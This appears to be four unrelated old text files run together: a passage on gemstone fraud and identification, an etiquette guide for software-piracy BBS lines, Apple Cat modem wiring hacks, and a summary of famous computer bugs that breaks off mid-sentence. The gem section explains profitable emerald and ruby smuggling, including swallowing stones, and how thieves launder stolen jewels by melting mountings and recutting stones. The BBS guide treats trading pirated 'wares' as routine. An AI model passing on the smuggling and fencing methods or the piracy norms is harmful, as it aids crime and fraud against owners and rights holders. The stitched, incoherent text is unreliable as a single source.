The most obvious, of course, is simply to sell a less valuable stone in a more valuable rating. We have seen, in the case of diamonds, how even though subjective, a small difference in the rating can make a large difference in the price. Again, never buy mounted stones.   Substitution of less valuable stones is an offshoot of this where colorless topaz may be substituted for diamonds since most stones are colorless and have quite a bit of luster. The specific gravity of the topaz qill approach that of a diamond. Of course, it won't pass other tests for a diamond.   Yellow quartz is often substituted for a yellow diamond. Red spinel is often offered for ruby. The worst examples of this occur in areas where the real stones are found.    Natural emeralds  sold on the streets of Colombia, Peru and Brazil are often made from the bottoms of 7 Up bottles...   Sometimes diamonds are manipulated by taking a yellow diamond and super polishing it to look white. On occasion oil may be rubbed in to make it whiter.   Obviously the stones should be examined as we've shown.   Burma, India, Ceylon, Brazil, Peru and even Hong Kong and Thailand are notorious places for substitution of non gem materials in gem sales.   Sometimes cut stones in upper and lower portions are cemented together. This is known as a doublet. It is possible to take two diamonds, the upper portion one and the lower of another and cement them together to create one diamond without the inherent flaws that the opposite piece had before the fushing processs.   It is also possible, and is almost as common, to find the upper portion of a doublet is genuine while the lower portion is cut from a comparatively worth  less material such as quartz or glass and then glued. If this is done with a great amount of skill, it will have the appearance of a single stone. It is legal to combine things such as diamonds, rubies, and sapphire doublets if they are not sold fraudulently  hehe .   It is possible to drop the stone in water or acetone and if it's a glued doublet, the glue will dissolve and the stone come apart. However, if glass has been used that's been fused to a diamond top, this will have no effect and the fusion must be found by careful, microscopic examination. This fraud is extremely difficult to detect.   A better test is to immerse the stone in a strong, refracting liquid such as methyelene iodide. This is diluted until suddently one part of the stone becomes invisible. This occurs when the refraction index of a liquid is the same as that of the stone and the quartz portion which has a much lower refraction number becomes invisible, leaving the diamond portion visible. This is an indication of a double stone. Indian jewelers are especially known for their production of such doublet stones.   For the extremely naive, it is possible to buy a false doublet. Here the color of the lower portion is imparted to the upper harder portion but neither party may be gem quality. This is when a piece of rock crystal quartz, a rather colorless stone, is used or glued to colored glass or colored stones. In this case, the top part will take on the color of the bottom part, although neither one is a gem stone.   Extremely cheap doublets have been passed off by using simple colored gelatin or coloring and quartz or glass and a bit of glue.   Besides these tricks designed to use modified stone, there are scams such as examing a stone or piece of jewelry and having a second made to match and swapping the two. This can be done when someone goes to answer a newspaper ad, does not buy it but takes a picture or impression of it. Then his friend makes the phony and goes to  examine  the piece and switches the new for the old.   It may also be discovered a stone has been replaced with CZ after the piece was left for cleaning or appraisals.   Faked stones mounted in jewelry and then hocked is the oldest game in the world. The perpetrator runs out of money, offers to leave his precious ring as a security until he can get the money he borrows back to the person. The person may or may not skip with the stone, feeling he has the  5,000 ring.

The device is called a firescope and directs a red light into the stone and measures the amount of light reflected through the crown. One can use the firescope and look at a diamond and immediately tell if the diamond is leaking light, which means it has non well proportioned areas on the cut. If the diamond appears in completely red, this means it is reflecting and refracting all the light it should A great idea.   EMERALDS            Emeralds are a green crystal of beryllium aluminum silicate. The chemical formula is Be3Al2 SiO3 6  use some of that great information you learned in high school . They are hexagonal prismatic crystal with a hardness of 7 1 2 to 8 on the Mohs scale. They are not tough stones and may be broken easily by mishandling or the use of severe chemicals or ultrasonic cleaners. If you own an emerald, be careful of it. Don't wear it during sports. Don't have a jeweler clean it in an ultrasonic cleaner as it may shatter.   Emeralds also break under applications of heat and should never be in a ring that is soldered. Under ultraviolet light they may fluoresceslightly, orangish red to red, or they may be inert.   Emeralds come from a number of sources. The best come from Colombia. These are the purest colored and generally the finest stones. The emeralds from Brazil are lighter, have more inclusions and are generally smaller than from other areas. Zambia, Africa, produces some bluish stones and some near Colombian stones. Zimbabwe is home to a particular emerald known as the sandawana emerald which is generally small with a rich green color. Anything over 1 3 carat is rare.   South Africa produces some low quality emeralds. Tanzania produces a few very good quality emeralds. Pakistan has just discovered some high quality emeralds. Afghanistan tends to produce flawed but good colored emeralds. USSR does produce emeralds but doesn't like to let them out of the country. Australia produces some dubious quality emeralds and North Carolina a few gems. Austria and India occasionally produce emeralds.   Emeralds are not unusual as the word emerald simply indicates an extremely nice version of a fairly common stone known as beryl. It is possible to buy something legitimately called an emerald for about  5 a carat. Obviously this is full of flaws, not transparent and so impure in color it looks more like jade than an emerald. They would never be sold in a jewelry store but emeralds do sell on TV and some of the better magazines for  5 per carat.   Gem quality emeralds range anywhere from  400 to  18,000 a carat, depending upon their quality. As the stones get larger, they become increasingly rare and sell for considerably more money.   Color is a critical factor in emeralds and constitutes about half of the stone's value  clarity 30  and cut 20  .   Hue describes the primary color and any other colors in the stone.  Most emeralds are green hued with a bluish hue also visible, especially the better Colombian type emeralds.   Tone is the depth or darkness of the color as perceived by the eye.   Saturation is the amount of hue present in any given color.   Depending upon where the emeralds come from, they can exhibit a wide range of color  i.e., Bra ilian emeralds are usually lighter toned and less saturated than their Colombian cousins.   The green in the emerald is caused by trace elements of chromium and or bandium. If the color is very light green, the stone is more correctly referred to as green beryl, not emerald.   Emeralds are often oiled to help their appearance. Normally an uncolored oil such as Merck cedarwood oil is used. The stone may soak in the oil for several days and will actually take the oil in somewhat, helping bring out the color and  wedding  on some of the dry inclusions, making the stone look better.   If one finds an emerald that is mild in color or has a grayish hue, it is a good bet to soak it in oil a couple days and it may regain its green color, not to mention its value.   A more unscrupulous  improvement  is to use dye or oil with color in it. It is possible to influence the color of a stone by having it soak up colored oil.   Other problems with buying emeralds are the fact that there are a  number of stones that look like emeralds and overlap colors. Tsavorite, a garnet found in Kenya and Tanzania, looks quite a bit like emerald and has a pure green hue, although it tends to be a little bit more yellowish and never has the blue hue of emerald.   Chrome tourmaline is another stone that looks much like an emerald with a moderately strong green color. Another emerald look alike comes from Africa and is called chrome diopside. All these stones can, and are, sold as emeralds to the unwary.   Different emeralds from different areas tend to have individually shaped inclusions  i.e., slight pyrite inclusions are typical of emeralds from Colombia although they can be seen in stones from other sources.   A three phase inclusion that shows up under a 1 Ox or stronger microscope, which has a distinctly liquid area, a gas bubble in a solid square rock crystal, salt Iying superimposed on each other inside a jagged edged cavity, is typical of emeralds from Colombia and proves their natural origin.   Tropiche emeralds from Colombia sometime exhibit six fine radiating arms of black carbon inclusions, spoke like in appearance.  Another type of this stone has six arms of emeralds extending from the center of the crystal with a white shaped wedge area in between. When these stones are cut and mounted, they are valuable because of their inclusions.   Emeralds are subject to not only customs duty but market restraints as there is no OSO type organization supporting them. It is possible, if one is smart and has verification equipment, to buy emeralds in other countries, notably South America, and smuggle them to America for profit. Coincidentally, the areas one smuggles emeralds from are the same areas one smuggles cocaine from and these passport stamps tend to yell search me, search me. Some people even go to the trouble of swallowing and then recovering emeralds although obviously, we do not encourage or advise this dangerous practice.   RUBIES          Ruby is a specie of corundum and ranges in color from orange red to purple  red. It is medium light to very dark in tone and quite strong in saturation. Chemical composition of a ruby is Al203 It is a hexagonal crystal that often comes in six sided prisms, terminated by flat faces.   Ruby registers a 9 on the hardness scale and is quite tough, unlike the emerald, and not nearly as subject to breakage. Under long wave ultraviolet, a ruby will fluoresce red or orange red to inert and under short wave should fluoresce moderate red to orange red.   Rubies come from a number of areas including Burma, which is usually considered as the finest source of rubies in the world. The best Burma stones are medium dark and vivid red.   Thailand produces stones which are a bit dark in tone and range from purple to brownish red because they have a slight bit of iron in them.  Africa  Kenya, Tanzania  produces stones that are normally highly included although reminiscent of Burma in color. Sri Lanka has occasional rubies but more often sapphires that often mask as rubies.   In the U.S.A., North Carolina and Montana produce a few stones. Australia produces fairly poor quality stones as does India and Colombia, Nepal and Pakistan.   Rubies tend to be valued partially by the country of their origin. Some rubies now come with authenticated certificates of origin and the word Burma will bring a characteristically premium price even when considered next to a Thai ruby that may appear identical to the Burma ruby under incandescent light.   Under fluorescent light, the Burma ruby will appear to fluoresce slightly and take on a deeper saturation. This is a highly sought after quality. Burma rubies also have some fine rutile needles that are commonly referred to as  silk  that add rather than detract to the attractiveness of the stone and further establish it as a Burma stone.   In order to establish a country of origin, a certified lab such as the American Gemological Laboratories in New York, has to study the ruby for body color under various conditions, fluorescence and inclusions. If a ruby is certified as a top Burma ruby, the price may be 1 1 2 or twice what it was as an unknown or as a presumed Thai ruby.   Rubies from Thailand tend to have a brownish or purplish overtone.  Those from Sri Lanka are generally very pink in color and more correctly referred to as pink sapphire.   There are a number of ways to treat rubies to improve their color, clarity and ultimately, their value. The quick fix method is to dye or oil the ruby which will help hide fractures, inclusions and improve the color of the stone.   A further refinement of this is a diffusion process where stones are immersed in a chemical bath which contains a number of chemicals including chromium which gives the ruby its color in the first place. This color is carried in the skin of the ruby by the chemicals and actually penetrates the skin. This generally produces a light tone and the tone is only a skin which will dis  appear upon repolishing.   The next common treatment is a heat treatment. Rubies stand heat far better than emeralds do and it is fairly Gommon to heat both rubies and sapphires which tends to improve the color by driving out bluish or brownish tints and will tend to dissolve the transparency, lessening the  silk  inclusions on heavily included stones.   These treatments all are dependent upon temperature, time and cooling rate, but they will bring about a permanent change in the stone leaving no chemicals or treatment to be removed.   In top ratings, rubies are rarer than diamonds but the actual supply of top stones may vary greatly because of political situations. Many stones reach the world markets because they have been smuggled out of places  especially Burma  through Thailand and other friendlier countries. There is a fair amount of profit to be made in the smuggling of rubies.   Smaller, included or industrial strength stones, are cheaper than their diamond cousins because they are more easily available.   The rhodolite garnet often approaches ruby in color, although tends to be more purplish than the ruby and less saturated but still are sometimes sold as rubies.   Tourmaline also occurs in many color ranges including ruby red and is sometimes sold as ruby.   A new stone called red spinel has a remarkable resemblance to ruby and is not often seen on the market because it is generally sold as a ruby.   Rubies have been synthesized since the late 1 800's. There are two primary methods of synthesizing rubies   the fusion method and the pulling method. In the 1950's, several manufacturers began flux growing rubies which takes considerably longer than the other methods and produces a stone much closer to its natural version.  Flux grown rubies tend to be extremely clear and transparent with an orange overtone.   Fusion stones tend to be strikingly flawless looking while the flux methods may actually produce a number of inclusions resembling silk.   One clue to synthetic rubies is the cut. Because the material is cheapsr and waste is not as much a problem, machine cuts such as square or rectangular cuts are more prevalent.   JEWEL IDENTIFICATION AND THEFT                                  Because each gemstone is unique when considered with all its variables  cut, color, irregularities, inclusions, refraction, reflection  it is possible to photograph a particular stone and record its measurements and ratings to establish a unique fingerprint that will identify that stone as surely as a serial number.   This procedure is now being carried out on certain stones by certain insurance companies and individuals. The cost factor is prevalent.   Even if a stone is  fingerprinted  and then stolen, there is no centralized source location that every buyer or even every jeweler or gemologist will check before purchasing the stone. This record comes into play more often when a stone is recovered and ownership is in question.   There are some exceptions to this rule. Stones that are of immense value or highly individualistic are put on hot lists. Organizations such as Interpol keep a record and submit copies of printed information along with any suspects' names to various countries' police agencies, and a group called the Jeweler's Security Association puts out bulletins and occasionally flashes to their various members on particularly bold, large or unusual gem thefts.   The criminal counter to this type of recordkeeping is to immediately remove any stones from their mountings and melt the mountings down for the precious metal they contain. The stone is then sold individually or mixed in with a group of other non illegal stones and sold in a grouping. As anyone knows, if the stone is held a while, the  hotness  becomes less of a factor in a sale.   Large, unusual or famous stones can be taken to a less than honest cutter, who can cut the stone down into a number of smaller stones. This wastes some of the material as does any cutting procedure and makes the stones intrinsically less valuable as size is a coveted asset in investment quality  or even jewelry quality  gemstones.   In spite of identification and insurance company efforts, jewels still remain one of the most highly sought after targets and any jeweler or diamond cutter realizes he must constantly update his security precautions and it is still probably only a matter of time before he is hit. Insurance rates for these people are fairly substantial as one would imagine.

And of course, there are even more idiots who call the lines and don't know what they are doing.  This makes life difficult for the few of us who want to easily use the lines. This file will hopefully help sysops become better sysops, help sysops make their lines better, and help the idiots who don't know what they are doing make life easier for us. With that in mind, let us start.         SYSOPS AND THEIR AE LINES                                    The thing I hate most are the sysops who constantly break into chat. I'm not talking about when somebody wants to chat, I'm talking about the assholes who break in and say things like  Who is this   or  What are you going to upload  . That pisses me off.  Usually I hang up on the assholes  unless of course they have a ware up that I want .  There is one AE that I called where it seemed like the sysop stayed home all day pinned to his computer chair waiting for somebody to call.  Every time that I called he would break in and ask if I was going to upload, and then spend ten minutes telling me what I should upload.  That is a definate problem.    Then there are the sysops who never change the wares that are up on the lines. I mean, you know how frustrating it is to finally get onto a board that you called two weeks ago and find out that the wares haven't changed   They don't even make room for uploads.    Okay, those are two negatives.  Here's a positive.  I know of one sysop who updates his AE.WELCOME every now and then to include some news of the line. Actually, quite a few do this, but only one that I've seen is updated to include something meaningful.  That same sysop has help files for new users of the AE world. This one isn't too important, but worth mentioning since it is a nice addition to a line.    One final word on sysops.  If a sysop is around and hears a page, then he should answer it.  I hate it  and you probably do too  when a sysop lets his presence be known by hitting a few keys  and messing up whatever you were doing  and then not answering when you page him only four seconds later.    To start things off with the lines themselves, let's start with hardware.  An AE line should definately have at least two drives and should always have a slot three or slot five ramdrive.  Even if it is only sixty sectors, it is enough to keep the clutter of messages and ads off of the main drives.  And as for disk drives, what the hell is the use of calling an AE that has only one drive   I don't know, that's why I don't call them.  They are always filled with messages and ads anyway, the only wares on them are single file ancient games.    AE lines should be up 24 hours a day, seven days a week, 365 days in a year  not that any of them stay up longer than a year .  AE's that have hours to call are stupid and a pain in the ass.  If you can't have it up all the time, don't put them up at all.  It's okay to take it down while you use the computer, but don't use the same line for your voice and modem.  Oh, AE lines NEVER have call waiting on them.  STUPID!    AE lines with a hard drive always should have a wares map.  Do you know what a pain it is to search through 65 volumes only to realize that there were no wares that you wanted in the first place   I'm sure you do because it happens to just about everybody.  As long as we're talking about hard drives, make sure that all of your wares are on the first volumes!  Don't have wares on volumes 1 13, and then skip over to volume 43 59.  Actually, that would be okay if you have a wares map, but since most AE's don't  sysops are too lazy and care too little about their system to spend no more than ten minutes making one  keep them in order.    Back to sysops.  They should always make sure there is at least one meaningful ware up.  Sorry all you assholes who put up three drives that say  UPLOAD HERE  and one drive that contains nothing but messages.  Most people aren't going to upload without getting something first.    AE's with password programs should have a hard drive, or at least three drives.  Otherwise it is like having a one drive AE  see above  because the password program takes up 3 4 of the disk space, leaving no more room on it for wares.    Sysops should never get on line and say  You can't take anything until you upload first! .  First of all, sysops shouldn't get on unless they are called for anyway  see above .  An AE line is made for downloading, and some uploading. I am not condoning leeching, I think leeches should die  we'll get to that later , but forced uploading  except for upload weekends, which seem to work great  is stupid.    Sysops shouldn't suppress anything unless it is absolutely necessary.  For instance, if you have a password program you will need to suppress the at sign     so that nobody can read your private stuff.  Or, if somebody is terrorizing your line by putting  L's or  J's in the catalog, and they continue doing so, you should suppress that.  But under no circumstances should you ever suppress the space bar, no matter how many times you are crashed.  It makes it difficult to read write text files.    To end with this section, let me just say that if you follow the simple rules, things will be easier for all of us, even you.       AE LINE USERS                      Let's start with a very important topic, the chat option.  Almost all AE lines have a text file named 'CHAT' or 'PAGE' or something like that, and they shouldn't be used abusively.  Use it once if you need to, but if the sysop doesn't answer, either try later  after a transfer, not two minutes later  or leave private mail to the sysop.  Also, never make your own chats.  If there is no chat up, the bell is probably disabled anyway.  If it isn't, the sysop doesn't want to be disturbed  I don't condone that either, but you might as well respect it .    If you upload something, leave a brief description of what it is.  I for one hate taking something that I have no idea about, and I am tired of seeing those  WHAT IS _________   messages.    NEVER LEECH! That is one of the most important.  I'm not saying that you have to give for everything that you take, but if you take more than one thing, especially if you do it on the same call, give something in return.  I don't know about you, but I like uploading.  I just upload and watch TV why it is transferring, and when I'm done I can sign my name and feel proud that I did that  since very few people do upload .  Always, it puts you off the spot on individual password AE's, and makes you more popular in the AE world if you upload to a lot of different AE's.  And one word of advice, never upload to a ram drive.  If the power goes out or the sysop turns off the machine without saving the ram drive, the ware is wasted.    Learn how to leave private mail.  I can't imagine somebody not knowing, but you need to know.  I'll tell right now.  Just right TO SYSOP or whatever, skip three spaces    , then write something else after it like your name or the date or something.    If you are leaving a message to another user, put a date after his name so if there are more than one he knows which he has read.    Read the sysop's want list and upload something he wants.  Make sure you don't upload something he has.  How useless can you get.   Conclusion               I guess that's about all for now.  As new ideas form I'll bring you a new volume of this guide, or maybe somebody will write a new one with his own ideas  I hope I didn't start a trend like the REAL PIRATE'S GUIDE.  I don't want to see THE DO'S AND DON'TS OF ASCII EXPRESS PART XIV .  Just remember other people when you are doing something, whether you are a sysop or a user, and everything will run a lot smoother out in that AE jungle. I'm not going to list AE's now at the end of this file.  That is useless.  By the time somebody reads this it will probably be down! Later everybody.                 Humorous Note   After Quasimoto uploaded this file to my board, he looked around, saw Robotech II, and started to leave a message asking what it was    something I had explained in the AE.WELCOME.  On the same call, he also uploaded a file that not only did I already have, but that was up on the board at the time!

THE PIPELINE..BBS CATFUR 300 1200        OVER 10MEGZ  718  351 5678      The Apple Cat    modem is by far the most expandable modem on the market today. Of course it's also the choice modem of pirates because of it's inexpensive half duplex 1200 baud capabilities.  The expansion module available for the cat has several very useful functions. Rather than shelling out  30 bucks for one which you may only use a few of the features this file tells you how to build just certain features or even the whole package.     First off you'll need some basic knowledge and tools.  As for the knowledge you'll need to know how to solder pretty well, you'll also proabibly have to know DC from Hz and  12V from RS232.  Ok now, If you can handle that that, you'll need these tools     A soldering iron and solder   A flat, 14 wire, female cable. Preferably multi colored.       Note  Single strands of wire will do but they risk damaging your cat.     We'll be connecting the wires to the J2 connector  see owner's manual, fig. 2 .  Remember that there are 25 pins on this connector.  Each pin numbered starting with pin 1 in the rear of your computer and pin 25 closest to the keyboard.  We'll only be working with the first 14 pins.  The rest are for the 212 and speech synthesizer cards.   Here is a table which tells something about each pin   Pin         Function     Direction    Feature                                                                               01    Transmit Data       Output    EIA RS232C Printer interface   02    Receive Data       Input       03    Clear to Send Signal      Input       04    Signal Ground        GND                                                                                    05    AC line reference  60Hz      Input     BSR Remote control   06    Signal Ground        GND        08     12V DC        Output      09    120 KHz Control Signal      Output                                                                                  07     12V DC        Output    Off Hook LED   12    LED Drive       Output                                                                                  10    Tape Recorder Control      Input     Tape Recorder   11    Tape Recorder Control      Output      12    Audio Signal to Tape      Output      14    Signal Ground        GND                                                                                    Note  This table corrects several errors which occur in the table in the Owner's Manual.                                                                              Bulidin' the On Off hook indicator                                    Required parts  12V DC LED                                       This is the most inexpensive and simple of the projects.  All you must do is connect the wire leading from pin 7 to the positive pole of the LED and connect pin 12 to the remaining pole.  Solder connections firmly and whenever the modem is off hook the LED will light.  Hooking up a tape player                          Required parts  Tape Recorder with adjustable record level, 3.5 mm patch cable  male on one end  stripped on the other, Patch cable with 2.5 mm plug on one end stripped on the other.                             This is proabibly the most useful feature.  With this feature you may listen in on your cat.  Such as when calling a board you'll never have to pick up the phone. You also might want to do an answering machine.  I'll tell you more about that later.     To build this you must take the wires leading from pins 10   11 and connect them to the stripped ends of your 2.5 mm patch cable.  Now take the wires leading from pins 13   14 and connect them to the stripped ends of your 3.5 mm patch cable.     Note  You may have to reverse which pin goes to which wire on each cable if it doesn't work at first.  Now, simply plug the 3.5 mm plug into the Mic jack on the tape recorder and plug the 2.5 mm plug into the Rem jack on the tape recorder.     To use this you just press the Rec button s  on your tape recorder. On most tape recorder you'll be able to hear what is going on when the modem picks up the phone.  You'll notice that the tape does not move when you press record, you must do a POKE 49313,31  Default   0  to turn on the tape.  That is how you make your answering machine.     Note   I have included an answering machine program at the end of his file.  Bulidin` the EIA RS232C printer interface                                           Required parts  Serial printer, RS232C cable                                              This is pretty difficult to explain.  We'll start by looking at the RS232C port on the back of your printer.  This port has two rows of holes.  One row has 12 holes and the other has 13. We'll number these holes by going left to right the first holes are 1 to 13 on the largest row, next go to the left of the smaller row and number from 14 to 25.  Not all of these holes will be used. This chart tells which wire goes to which hole   Pin     Hole s                    01      12   02      11   03     19 3  19 first    04      07                  Hooking up the BSR Remote Transformer                                       Required Parts  BSR Remote Transformer                                           Note  This is really quite dangerous and I recommend if you wish to use this function and are unsure of your abilities that you buy an expansion module.     Now, look at the square end of your transformer.  Each hole should have a number next to it.  If you don't see these numbers than just number counter clockwise starting at the bottom left corner  notch facing the floor . There is really no good way to get the wires to stay in these holes.  You may want to go to Radio Shack and look for something.  Anyways be sure the transformer is not plugged into the wall and connect each pin to each hole as shown   Pin  5    Hole  3 Pin  6    Hole  1 Pin  8    Hole  2 Pin  9    Hole  4    Caution  Be sure that no wire touches another wire!     To use this you must have at least one of those modules which come with the real BSR Command things.  There is a program on your Com Ware disk to control this.                                                                                    Caution  When working on these features be sure to connect them to the pins last or else damage to you or your cat may occur.

Originally From John Shore  shore nrl css    Some time ago, I sent out a request for documented reports on   famous bugs ,  promising to summarize the results for all who contributed.   This is the promised summary.     I judge the effort as a failure.  People encounter bugs and fix bugs  and talk about bugs, but they rarely document bugs.  Those responding  to my request were well meaning and helpful, but I was left feeling  a little like my hair was being done by a gossip laden ex hacker.     I am, of course, no different.  I didn't have documentation for  most of the famous bugs I knew about, and I don't have sufficient time,  energy, and interest to follow all the leads.  I should have known better.     One strong conclusion that I've reached is that many  computer system horror stories become known as bugs when in fact  they are not    they're system problems that result from hardware failures,  operator mistakes, and the like.  Let me mention a few examples.  In his  book Software Reliablility, Glenford Myers mentioned a number of classical  software errors.  For example, he mentioned that a software error in the onboard computer of the Apollo 8 spacecraft erased part of the  computer's memory.  I happen to have a copy of a memo by Margaret  Hamilton that summarized the conclusions of a detailed study of  every Apollo bug  see below , so I looked under Apollo 8.  The best  I could find was this   16. Illegal P01.  P01 was selected during  midcourse, illegally by the astronaut.  This action destroyed W matrix   several erasables in AGC .   The software did erase the memory, but it  did so because the astronaut did something illegal, and not because the  programmer goofed.  This example is characteristic of the Apollo errors   see below , most of which show the need for better exception handling as  part of the software specification.  But weak specifications are not  the same thing as bugs.     Here's another example, also from Apollo.  It starts with a  note to me from Kaeler.pa at Xerox  via Butler Lampson        I heard about the MIT summer student at NASA whose Apollo program filled     up memory  with logging information  and flashed the red abort light a     few seconds before the first moon landing.  The student was in the     control room, and after a little thought, said,  Go ahead, I know what     it is, I will take responsibility .  Luckily, he was right.  He was     awarded all sorts of medals for being willing to take the     responsibility.   You should get this story from the horse's mouth before distributing     it.  I heard it from Neil Jacobstein  212 454 0212, in new york .  He     heard it from his advisor at the Johnson Space Center in Houston a few     years ago.  It might be interesting to trace this back to someone who     really knows about it.  I called Jacobstein, and after some discussion he decided that the  bug   was probably the famous  1201 descent alarm  that I mention below.   Again, this was caused by an astronaut error  a radar was turned on  when it should have been off .     Lot's of people mentioned to me various NORAD  bugs  that  caused alerts.  I got a copy of a Senate Armed Services Committee Report of  9 October, 1980,  Recent False Alerts From the Nation's Missile  Attack Warning System.   It deals primarily with the June 1980 alerts,  but it contains the following summary       Oct. 3, 1979    An SLBM radar  Mt. Hebro  picked up a low orbit rocket      body that was close to decay and generated a false launch and impact      report.      November 9, 1979    False indications of a mass raid caused by inadvertent      introduction of simulated data into the NORAD Computer System.      March 15, 1980    Four SS N 6 SLBMs were launched from the Kuril      Islands as part of Soviet troop training.  One of the lauches generated      an unusual threat fan.      June 3, 1980    False indications caused by a bad chip in a communications      processor computer  According to Borning Washington  who by the way is studying computer  problems in missile warning systems , the cause of the Nov. 1979 problem  was as follows       To test the warning system, false attack data was intermixed with data     from actual satellite observations, put on tape, and run through the     system.  On November 9, the test tape of this sort was accidentally     left mounted on a secondary backup computer.  This machine was left     connected to the system in use.  When the primary computer failed, a     backup computer was activated, which also failed.  Then the secondary     computer came into play, causing the alert.  All of these missile alerts were caused by real flying objects, hardware  failures, or human error.  I'm not saying that bugs didn't cause any  missile alerts, just that the ones that are reputed to have been  caused by bugs in fact were not.     Perhaps computer software    as opposed to the combination of  hardware, software, and people    is more reliable than folklore  has it.  I would be interested in hearing your comments on this  proposition.     Despite the foregoing problems, the assembly of responses makes  interesting reading.  In the following, I'll mention a few  well documented bugs and then append various extracts  from what I received.  Thanks to all who responded.  In most cases, I  eliminated duplicates.  Special thanks to Peter Neumann  SRI ,  who seems to be keeping better track of these problems than anyone else.   Many of these don't qualify as bugs by anyone's definition, but  they're interesting stories so I've included some of them anyway.                   Space Shuttle Bug   This may be the most famous of all    the one that delayed at the last minute the launch of the first space shuttle.  The cause was was  a bug that interfered with the communication between concurrent  processes    an area of progamming that is among the least well in hand.   John R. Garman wrote about the problem in detail in ACM SIGSOFT Software  Engineering News  SEN , vol. 6, No. 5, pp 3 10.                    The First Bug   Worth mentioning for the trivia folks, it was a moth that  was beaten to death by a relay in the Mark II.  It was discovered by the  Mark II staff, which included Grace Hopper.   Reports on this  are a bit confusing.  Many attribute the bug to her  in her own  published account she refers to  we .  I called and asked her.  She  said the machine operator actually pulled the moth out, and that it  was found by the combined efforts of the staff.   Lots of people mentioned  this bug to me  my favorite report attributed the bug to     some little old lady who works for the Navy.  She's the   one who came up with Cobol, I think.     In fact, this is one of the better documented bugs.  You can even  see its picture in the Anals of the History of Computing  vol. 3,  July 1981, page 285 .  It's ironic that  modern  bugs have  practically nothing in common with the first one  an exception being  Dijkstra's well known remark about testing .                    ARPANET Gridlock   In October 1980 the net was unusable for a period of several  hours.  It turned out that the routing processes in all the IMPs were  consuming practically all resources as the result of processing three  inconsistent routing updates.  It turned out that the inconsistency  arose from dropped bits in a single IMP.  Whether you choose  to call this a bug or not, clearly it demonstrated a design failure.  The  details are reported well by Eric Rosen in SEN, January 1981.                           APOLLO flight experiences   When Margaret Hamilton was working at the Charles Stark Draper  Laboratory in the early 1970s, she documented and analyzed in some  detail the various  software anomalies  that occurred during several  APOLLO flights.  Apparently she did this at the request of Marty Shooman.   I don't think that she ever published the results, but  some years back she gave us a copy of  Shuttle Management Note  14    23 October 1972 , which summarized her analysis.  It makes interesting  reading.     One of her strongest conclusions was that 73  of the problems were  caused by  real time human error .  Translated roughly into 1983  computer speak, this means that the APOLLO software wasn't user friendly.    I guess they didn't have icons or something.   Apparently, there  was much debate about this during the design, but the software types  were told that astronauts have the right stuff or something so there  was no need to make the software robust.     One example is quite widely known, as it occured during the APOLLO  11 landing on the moon.  In what was referred to as  1201 1202 Descent  Alarms , the software kept restarting as the result of overloading.  Turned  out the radar switch was in the wrong position and used up 13  more  computer time than had been anticipated.     Hamilton states that  pure software errors  were not a problem on APOLLO flights.  I guess she means that the software met its specifications,  which is quite an accomplishment.  But the specifications apparently did  not say much about error detection and recovery.  Hamilton states that   all potentially catastrophic problems would have been prevented by  a better and or known philosophy of providing error detection and  recovery via some mechanism.     ________________________  Nuclear Reactor Design Program   I don't know when the bug was first introduced, but  it transpired in 1979.  From Jim Horning  Horning.pa parc maxc      A belatedly discovered bug in a stress analysis program  converting a vector into a magnitude by summing components  rather than summing absolute values  module written by a summer student  caused a number of nuclear reactors to be closed down for checks and reinforcement a about three years ago  not long after TMI . This was fairly widely discussed in the press at the time, but I never did see how the lawsuits came out  if, indeed, they have been completed .   From br10 cmu 10a came the following newswire stories   a023  0026  16 Mar 79 PM Topic, Advisory, Managing Editors  Wire Editors      It all started in a tiny part of a computer program used by an engineering firm designing nuclear reactors. It ended with the shutdown of five nuclear power plants at a time when President Carter is pushing oil conservation and the world oil market is in turmoil.     The computer miscalculated some safety precautions required by law. The power from the closed plants now will have to be replaced by electicity generated with oil or coal. This may cost utility customers money and throw a curve at Carter's conservation program.     In Today's Topic  The Little Computer and the Big Problem, AP writer Evans Witt traces this glitch in the system, from the obscure computer to its possible effect on the nation's energy problems.     The story, illustrated by Laserphoto NY7, is upcoming next.     The AP  ap ny 03 16 0328EST                  a024  0044  16 Mar 79 PM Topic Glitch, Bjt,950 TODAY'S TOPIC  The . yyter and the Big Problem Laserphoto NY7 By EVANS WITT Associated Press Writer     WASHINGTON  AP    Something just didn't add up.     And the result is   five nuclear power plants are shut down  millions of Americans may pay higher utility bills  and a sizable blow may have been struck to President Carter's efforts to reduce the use of imported oil and to control inflation.     The immediate source of all this is part of the federal bureaucracy   the Nuclear Regulatory Commission which ordered the shutdowns.     But in one sense, the ultimate culprit was ''Shock II,'' a tiny part of a computer program used by a private firm to design the power plants' reactors.     Shock II was wrong and that means parts of the five reactors might not survive a massive earthquake. Shock II was the weak link that could have allowed the chain to snap.     In between Shock II and the shutdowns were a public utility, a private engineering firm and the NRC staff. It was really the judgments of the dozens of scientists and engineers, not elected or appointed officials, that led to the shutdowns.     Perhaps as a result, the decision's impact on the nation's energy situation was not even considered until the very last moment   when the commission itself was faced with the final decision.     And at that point, the NRC said, it had no choice. It said the law was clear  serious questions about the reactors had been raised and the reactors had to be turned off until answers were found.     The specific questions are arcane engineering issues, but the explanation is straightfoward  Will some of the systems designed to protect the reactor survive an earthquake   or will they fail, and possibly allow radioactive death to spew into the air      The regulations say the reactors must be able to withstand a quake equal to the strongest ever recorded in their area. The regulations don't allow any consideration of the likelihood of a major quake. All four states where the reactors are located   New York, Pennsylvania, Maine and Virginia   have had minor quakes in this decade and damaging quakes at least once in this century.     The only way to test them   short of having a massive earthquake   is to test a model of the reactor. The ''model'' is actually a set of mathematical formulas in a computer that reflect how the reactor and its parts will behave in a quake.     The model used for the five reactors came from Stone and Webster, the large Boston engineering and architectural firm that designed the plants. The Stone and Webster model indicated how strong and well supported pipes had to be and how strong valves had to be.     The problem apparently cropped up after Stone and Webster suggested within the last few months more pipe supports in the secondary cooling system of the reactor at Shippingport, Pa., operated by Duquesne Light Co. in Pittsburgh.     But why were the supports needed  ''This was not clear to us, looking at the calculations done by the models,'' said Gilbert W. Moore, Duquesne's general superintendent of power stations.     So Dusquesne   and Stone and Webster   sent the computer models through their paces again, having them calculate and recalculate what would happen to the pipes in an earthquake.     ''We came out with some numbers which were not in the range we would like,'' Moore said.     That made the problem clear   the model now said the pipes might break in an earthquake. The previous analysis indicated an adequate safety margin in the pipes, and Stone and Webster's explanation was  ''One subroutine may not give uniformly conservative results.''     The problem was in a ''subroutine,'' a small part of the computer model, called ''Shock II,'' said Victor Stello, director of NRC's division of reactor operations.     ''The facts were that the computer code they were using was in error,'' said Stello. ''Some of the computer runs were showing things are okay. In some cases, the piping systems were not okay.     ''We didn't know the magnitude of the error or how many plants might be affected,'' he said.     It was on March 1 that Duquesne told the NRC of the problem 